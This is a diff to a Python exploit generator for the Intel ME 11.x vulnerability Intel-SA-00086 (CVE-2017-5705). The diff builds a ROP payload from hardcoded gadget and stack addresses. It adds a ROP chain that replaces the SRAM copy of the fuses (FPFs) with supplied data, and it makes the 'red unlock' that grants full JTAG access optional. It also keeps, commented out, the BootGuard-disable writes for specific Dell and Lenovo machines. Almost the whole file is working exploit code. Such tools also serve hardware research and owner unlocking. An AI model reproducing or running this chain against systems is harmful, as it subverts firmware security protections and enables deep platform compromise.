@@ -3,11 +3,10 @@
 # Port to ME 11.x by Youness Alaoui (@KaKaRoToKS)
 # Refactored and BootGuard disable support added by Mate Kukri in 2024
 
-from __future__ import print_function
 import argparse
 import struct
 
-descr = "Intel-SA-00086 PoC for ME 11.x"
+descr = "Intel-SA-00086 (CVE-2017-5705) exploit generator for ME 11.x.x.x"
 
 class MeInfo:
     def __init__(self,
@@ -31,7 +30,8 @@ class MeInfo:
                  retaddr_init_tracehub,
                  retaddr_run_scripts,
                  retaddr_bup_main,
-                 fpf_sram_copy_addr):
+                 fpf_sram_copy_addr,
+                 memcpy_addr):
         self.ME_VERSION = version
         self.PCH_TYPE = pch_type
         self.STACK_TOP = stack_top
@@ -42,7 +42,7 @@ class MeInfo:
         self.POP_ESP_ADDRESS = pop_esp_addr
         self.BUP_THREAD_ID = 0x03000300
         self.NUM_SHMEM_DESC = num_shmem_desc
-        self.ROP_ADDRESS = self.STACK_TOP - self.BUFFER_OFFSET
+        self.BUFFER_ADDRESS = self.STACK_TOP - self.BUFFER_OFFSET
         self.write_selector = write_selector
         self.dfx_agg_sel = dfx_agg_sel
         self.infinite_loop = infinite_loop
@@ -55,9 +55,10 @@ class MeInfo:
         self.retaddr_run_scripts = retaddr_run_scripts
         self.retaddr_bup_main = retaddr_bup_main
         self.fpf_sram_copy_addr = fpf_sram_copy_addr
+        self.memcpy_addr = memcpy_addr
 
 ME_INFOS = [
-    MeInfo(
+        MeInfo(
             version="11.6.0.1126",
             pch_type="H",
             stack_top=0x63000,
@@ -79,6 +80,7 @@ ME_INFOS = [
             retaddr_run_scripts=0x36CBC,
             retaddr_bup_main=0x310A1,
             fpf_sram_copy_addr=0x85274,
+            memcpy_addr=0x102E
         ),
         MeInfo(
             version="11.6.0.1126",
@@ -102,6 +104,7 @@ ME_INFOS = [
             retaddr_run_scripts=0x36CBC,
             retaddr_bup_main=0x310A1,
             fpf_sram_copy_addr=0x86270,
+            memcpy_addr=0x102E
         ),
 ]
 
@@ -111,43 +114,66 @@ def rop(addr):
 # Return current stack address with an offset above the stack
 # useful to build rop independent ebp
 def rop_address(me_info, rops, skip=0):
-    return rop(me_info.ROP_ADDRESS + len(rops) + (skip * 4))
+    return rop(me_info.BUFFER_ADDRESS + len(rops) + (skip * 4))
 
 def gen_write_rop(me_info, addr, val):
     rops = b""
-
     # Set edx and ecx in preparation for the mem write
     rops += rop(me_info.pop_6)                          # pop edx; pop ecx; pop ebx; pop esi; pop edi; pop ebp; ret
     rops += rop(addr)                                   # target address (edx)
     rops += rop(val)                                    # value to write (ecx)
     rops += rop(0)*4                                    # Unused (ebx, esi, edi, edi)
-
     # Write ecx value into address pointed by edx
     rops += rop(me_info.write_edx_and_pop_3)            # mov [edx], ecx; pop ebx; pop esi; pop ebp; ret
     rops += rop(0)*3
-
     return rops
 
-def GenerateRops(me_info):
+def GenerateRops(args, me_info):
     rops = b""
+    rops_start = me_info.BUFFER_ADDRESS
+
+    ### START - fake FPFs (NOTE: this must be first)
+    if args.fake_fpfs:
+        print(f"[*] Adding fake FPFs ROPs")
+
+        with open(args.fake_fpfs, "rb") as f:
+            fpf_data = f.read()
+        if len(fpf_data) != 256:
+            print("Invalid fake FPF data length (must be 256 bytes).")
+            return None, None
+
+        rops += fpf_data
+        rops_start += len(fpf_data)
+
+        rops += rop(me_info.memcpy_addr)                # memcpy
+        rops += rop(me_info.pop_3)                      # remove arguments
+        rops += rop(me_info.fpf_sram_copy_addr)         # dest
+        rops += rop(me_info.BUFFER_ADDRESS)             # src
+        rops += rop(256)                                # size
+    ### END
 
     ### START - bootguard disable rops for Dell OptiPlex 3050
-    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
-    rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x02fe3d71)
-    ### END - bootguard disable rops
+    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
+    # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x02fe3d71)
+    ### END
 
     ### START - bootguard disable rops for Lenovo ThinkPad T480
     # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0x14, 0x04400044)
     # rops += gen_write_rop(me_info, me_info.fpf_sram_copy_addr + 0xa0, 0x021A39B0)
-    ### END - bootguard disable rops
+    ### END
 
     ### START - red unlock
-    rops += rop(me_info.write_selector)                 # write_sideband_port
-    rops += rop(me_info.pop_3)                          # remove 3 arguments
-    rops += rop(me_info.dfx_agg_sel)                    # param 1 - selector
-    rops += rop(0)                                      # param 2 - offset
-    rops += rop(0x3)                                    # param 3 - value
-    ### END - red unlock
+    if args.red_unlock:
+        print(f"[*] Adding RED unlock ROPs")
+        rops += rop(me_info.write_selector)             # write_sideband_port
+        rops += rop(me_info.pop_3)                      # remove 3 arguments
+        rops += rop(me_info.dfx_agg_sel)                # param 1 - selector
+        rops += rop(0)                                  # param 2 - offset
+        rops += rop(0x3)                                # param 3 - value
+    ### END
+
+    ### START - restore stack to allow BUP to continue
+    print(f"[*] Adding BUP context restore ROPs")
 
     # Set edx and ecx in preparation for the mem write and set edi for later
     rops += rop(me_info.pop_6)                          # pop edx; pop ecx; pop ebx; pop esi; pop edi; pop ebp; ret
@@ -176,8 +202,9 @@ def GenerateRops(me_info):
 
     # Return to bup_entry
     rops += rop(me_info.retaddr_bup_main)               # continue initialization after call to bup_main
+    ### END
 
-    return rops
+    return rops, rops_start
 
 
 def GenerateSyslibCtx(me_info, syslib_ctx_addr):
@@ -195,10 +222,10 @@ def GenerateSyslibCtx(me_info, syslib_ctx_addr):
 # up to 0x380 with syslib context pointing up
 # chunk with pointers to ROP address
 
-def GenerateShellCode(version, pch_type):
+def GenerateShellCode(args):
     me_info = None
     for info in ME_INFOS:
-        if info.ME_VERSION == version and info.PCH_TYPE == pch_type:
+        if info.ME_VERSION == args.version and info.PCH_TYPE == args.pch:
             me_info = info
             break
 
@@ -206,16 +233,18 @@ def GenerateShellCode(version, pch_type):
         print("Cannot find required information for ME version and PCH type.")
         return None
 
-    print(f"[*] ME version: {version}, PCH type: {pch_type}")
-    print(f"[*] Generating Shell code(Stack top: {me_info.STACK_TOP:#x}, "
+    print(f"[*] ME version: {args.version}, PCH type: {args.pch}")
+    print(f"[*] Generating shell code (Stack top: {me_info.STACK_TOP:#x}, "
           + f"Buffer offset: {me_info.BUFFER_OFFSET:#x}, "
           + f"Target : {me_info.TARGET_ADDRESS:#x})...")
 
     # Add ROPs
-    data = GenerateRops(me_info)
+    data, rops_start = GenerateRops(args, me_info)
+    if data is None:
+        return None
 
     # Create syslib context and add it to the data
-    syslib_ctx_addr = me_info.ROP_ADDRESS + len(data)
+    syslib_ctx_addr = me_info.BUFFER_ADDRESS + len(data)
     (syslib_ctx, syslib_ctx_addr) = GenerateSyslibCtx(me_info, syslib_ctx_addr)
     data += syslib_ctx
 
@@ -228,26 +257,28 @@ def GenerateShellCode(version, pch_type):
     # Add padding and add TLS at the end of the buffer
     data += struct.pack("<B", 0x0)*(me_info.BUFFER_OFFSET - len(data) - len(tls))
     data += tls
-    
+
     # Could put ROPs here, but if it's more than one chunk, we wouldn't be able to get the full content.
     # So we just put a 'pop esp' with the ROP address into our chunk (bootstarting ROP).
-    data += struct.pack("<LL", me_info.POP_ESP_ADDRESS, me_info.ROP_ADDRESS)*8
+    data += struct.pack("<LL", me_info.POP_ESP_ADDRESS, rops_start)*8
     return data
 
 def ParseArguments():
     parser = argparse.ArgumentParser(description=descr)
-    parser.add_argument('-f', metavar='<file name>', help='file name', type=str, default="ct")
-    parser.add_argument('-v', metavar='<ME version>', help='ME version', type=str, default="11.6.0.1126")
-    parser.add_argument('-p', metavar='<PCH type>', help='PCH type', type=str, default="H")
+    parser.add_argument('-o', '--output', metavar='<output path>', help='output file path', required=True)
+    parser.add_argument('-v', '--version', metavar='<ME version>', help='ME version', required=True)
+    parser.add_argument('-p', '--pch', metavar='<PCH type>', help='PCH type', required=True)
+    parser.add_argument('--red-unlock', help='allow full JTAG access to the entire platform', action='store_true')
+    parser.add_argument('--fake-fpfs', metavar='<FPF data path>', help='replace SRAM copy of FPFs with the provided data')
     return parser.parse_args()
 
 def main():
     print(descr)
     args = ParseArguments()
-    data = GenerateShellCode(args.v, args.p)
+    data = GenerateShellCode(args)
     if data:
-        print("[*] Saving to %s..." % (args.f))
-        with open(args.f, "wb") as f:
+        print(f"[*] Saving to {args.output}...")
+        with open(args.output, "wb") as f:
             f.write(data)
     
 if __name__=="__main__":
